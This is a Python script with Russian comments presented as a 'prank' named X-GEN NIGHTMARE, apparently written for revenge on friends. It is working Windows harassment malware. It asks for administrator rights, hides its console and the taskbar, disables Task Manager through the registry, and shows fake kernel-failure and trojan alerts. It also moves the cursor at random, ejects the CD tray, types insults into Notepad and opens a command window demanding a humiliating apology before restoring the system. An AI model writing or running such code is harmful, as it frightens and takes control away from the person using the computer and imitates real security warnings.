#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# X-GEN NIGHTMARE v1.0 - Prank + Apology Required
# Выносит мозг, затем требует извинений, потом разблокирует.

import tkinter as tk
from tkinter import messagebox
import platform
import subprocess
import random
import time
import threading
import os
import sys
import ctypes
from ctypes import wintypes
import winreg

# ========== КОНФИГУРАЦИЯ ==========
APOLOGY_TEXT = "извини меня я тупой ишак друзья киданули и комп сломали хочу сделать месть"
CMD_MESSAGE = f'echo Извинись прямо сейчас: && set /p apology= && if /i "%apology%"=="{APOLOGY_TEXT}" (echo Принято. Возвращаю управление... && timeout /t 3 && exit) else (echo Неверные извинения. Компьютер заблокирован навсегда. && pause && exit)'
# ==================================

def is_admin():
    """Проверка прав администратора (нужны для некоторых действий)"""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def run_as_admin():
    """Перезапуск с правами администратора"""
    if not is_admin():
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        sys.exit()

def random_error():
    """Случайное системное сообщение"""
    errors = [
        ("Критическая ошибка", "Системный реестр повреждён. Код: 0x8007045D"),
        ("ВНИМАНИЕ", "Обнаружена несанкционированная активность. IP занесён в чёрный список."),
        ("СБОЙ", "Драйвер ядра ntoskrnl.exe не отвечает. Система будет перезагружена через 60 секунд."),
        ("Антивирус", "Обнаружен троян. Рекомендуется немедленно отключить компьютер."),
        ("Windows Defender", "Угроза: X-GEN.NIGHTMARE. Удаление невозможно."),
    ]
    error = random.choice(errors)
    messagebox.showerror(error[0], error[1])

def move_mouse_randomly():
    """Дёргает курсор в случайные позиции"""
    import ctypes
    user32 = ctypes.windll.user32
    screen_width = user32.GetSystemMetrics(0)
    screen_height = user32.GetSystemMetrics(1)
    
    for _ in range(30):
        x = random.randint(0, screen_width)
        y = random.randint(0, screen_height)
        user32.SetCursorPos(x, y)
        time.sleep(0.05)
    # Возврат в центр
    user32.SetCursorPos(screen_width//2, screen_height//2)

def open_close_cd():
    """Открыть/закрыть CD-ROM (если есть)"""
    try:
        import win32com.client
        shell = win32com.client.Dispatch("WMPlayer.OCX")
        cdrom = shell.cdromCollection
        if cdrom.count > 0:
            for i in range(3):
                cdrom.Item(0).Eject()
                time.sleep(1)
                cdrom.Item(0).Eject()
                time.sleep(1)
    except:
        pass  # Если нет CD-ROM или нет win32com — пропускаем

def flip_screen():
    """Переворачивает экран (Windows)"""
    try:
        # -90, 0, 90, 180
        orientations = [0, 90, 180, 270]
        for angle in orientations[:2]:  # два раза перевернём
            subprocess.run(f"powershell -command \"Set-DisplayResolution -Orientation {angle}\"", shell=True, capture_output=True)
            time.sleep(1)
        subprocess.run(f"powershell -command \"Set-DisplayResolution -Orientation 0\"", shell=True, capture_output=True)
    except:
        pass

def taskbar_hide():
    """Скрыть панель задач"""
    try:
        hwnd = ctypes.windll.user32.FindWindowW("Shell_TrayWnd", None)
        ctypes.windll.user32.ShowWindow(hwnd, 0)
    except:
        pass

def taskbar_show():
    """Показать панель задач"""
    try:
        hwnd = ctypes.windll.user32.FindWindowW("Shell_TrayWnd", None)
        ctypes.windll.user32.ShowWindow(hwnd, 1)
    except:
        pass

def disable_task_manager():
    """Отключить диспетчер задач (через реестр)"""
    try:
        key = winreg.HKEY_CURRENT_USER
        subkey = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
        try:
            winreg.CreateKey(key, subkey)
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg_key:
                winreg.SetValueEx(reg_key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
        except:
            pass
    except:
        pass

def enable_task_manager():
    """Включить диспетчер задач"""
    try:
        key = winreg.HKEY_CURRENT_USER
        subkey = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
        with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg_key:
            winreg.DeleteValue(reg_key, "DisableTaskMgr")
    except:
        pass

def type_apology_in_notepad():
    """Открыть блокнот и напечатать извинение (троллинг)"""
    try:
        subprocess.Popen("notepad.exe")
        time.sleep(1)
        # Эмулируем ввод текста (через powershell)
        apology_short = "я тупой ишак прости"
        for char in apology_short:
            subprocess.run(f'powershell -command "[System.Windows.Forms.SendKeys]::SendWait(\'{char}\')"', shell=True, capture_output=True)
            time.sleep(0.1)
    except:
        pass

def nightmare_phase():
    """Основной кошмар: хаос на экране"""
    # Скрываем панель задач
    taskbar_hide()
    # Отключаем диспетчер задач
    disable_task_manager()
    
    # Фаза 1: случайные сообщения
    for _ in range(5):
        random_error()
        time.sleep(1)
    
    # Фаза 2: дёргаем курсор
    move_mouse_randomly()
    
    # Фаза 3: открываем/закрываем CD-ROM
    open_close_cd()
    
    # Фаза 4: флип экрана
    flip_screen()
    
    # Фаза 5: открываем блокнот с извинением
    type_apology_in_notepad()
    
    # Фаза 6: финальное сообщение
    messagebox.showwarning("КОШМАР ЗАВЕРШЁН", "Теперь извинись в CMD. Откроется окно. Введи текст в точности.")
    
    # Фаза 7: CMD с требованием извиниться
    subprocess.run(f'start cmd /k "{CMD_MESSAGE}"', shell=True)
    
    # Ждём, пока пользователь введёт извинение (просто пауза)
    time.sleep(30)  # даём 30 секунд на извинение
    
    # Восстанавливаем нормальное состояние
    taskbar_show()
    enable_task_manager()
    
    messagebox.showinfo("Прощение", "Извинения приняты. Возвращаем управление. Не кидай больше друзей.")
    
    # Финальный сброс экрана
    subprocess.run(f"powershell -command \"Set-DisplayResolution -Orientation 0\"", shell=True, capture_output=True)

def main():
    # Запрашиваем права администратора (для некоторых функций)
    if not is_admin():
        run_as_admin()
        return
    
    # Скрываем консоль
    if platform.system() == "Windows":
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    
    # Запускаем кошмар в отдельном потоке, чтобы не заблокировать GUI
    threading.Thread(target=nightmare_phase, daemon=True).start()
    
    # Просто держим скрипт живым
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        pass

if __name__ == "__main__":
    main()